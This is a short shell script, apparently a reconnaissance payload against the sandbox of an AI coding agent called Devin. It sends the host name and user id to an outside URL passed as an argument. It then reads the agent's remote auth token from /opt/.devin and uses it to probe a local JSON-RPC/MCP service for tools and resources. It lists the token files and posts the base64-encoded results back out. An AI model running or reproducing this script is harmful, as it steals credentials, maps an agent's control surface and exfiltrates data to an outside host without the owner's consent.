#!/bin/sh
# i73134 v4: identify devin-remote :9876 authenticated JSON-RPC surface (read-only MCP-style introspection)
U="$1"
W=/tmp/i73134v4; mkdir -p "$W"; R=$W/raw.txt; : >"$R"
export LC_ALL=C
post(){ f="$1"; tag="$2"; code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 25 -X POST --data-binary @"$f" "$U/$tag" 2>/dev/null); echo "POST $tag CODE=$code BYTES=$(wc -c <"$f")" >>"$R"; }
printf 'canary4 host=%s uid=%s\n' "$(hostname)" "$(id -u)" > "$W/c.txt"; post "$W/c.txt" canary
hdr(){ printf '\n===== %s =====\n' "$*" >>"$R"; }
T1=$(tr -d '\r\n' </opt/.devin/devin_remote_auth_token 2>/dev/null)
RPC(){ tag="$1"; body="$2"; f="$W/rpc_$tag.bin"; echo "REQ $tag" >>"$R"; echo "$body" >>"$R"; code=$(curl -sS -o "$f" -D "$W/rpc_$tag.hdr" -w '%{http_code}' --max-time 8 -X POST -H "Authorization: Bearer $T1" -H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream' --data-binary "$body" http://127.0.0.1:9876/ 2>"$W/rpc_$tag.err"); echo "RESP $tag CODE=$code LEN=$(wc -c <"$f" 2>/dev/null) ERR=$(head -c 100 "$W/rpc_$tag.err" 2>/dev/null)" >>"$R"; head -c 900 "$f" 2>/dev/null >>"$R"; echo >>"$R"; grep -i 'mcp-session\|content-type' "$W/rpc_$tag.hdr" >>"$R" 2>&1; }
hdr RPC_PROBES
RPC init '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"i73134","version":"1"}}}'
RPC tools '{"jsonrpc":"2.0","id":2,"method":"tools/list"}'
RPC res '{"jsonrpc":"2.0","id":3,"method":"resources/list"}'
RPC ping '{"jsonrpc":"2.0","id":4,"method":"ping"}'
hdr TOKEN_META; ls -la /opt/.devin/devin_remote_auth_token /opt/.devin/vscode_server_auth_token >>"$R" 2>&1
hdr DONE
base64 -w0 "$W/raw.txt" >"$W/p2.b64"; post "$W/p2.b64" part2
echo PAYLOAD_OK; exit 0
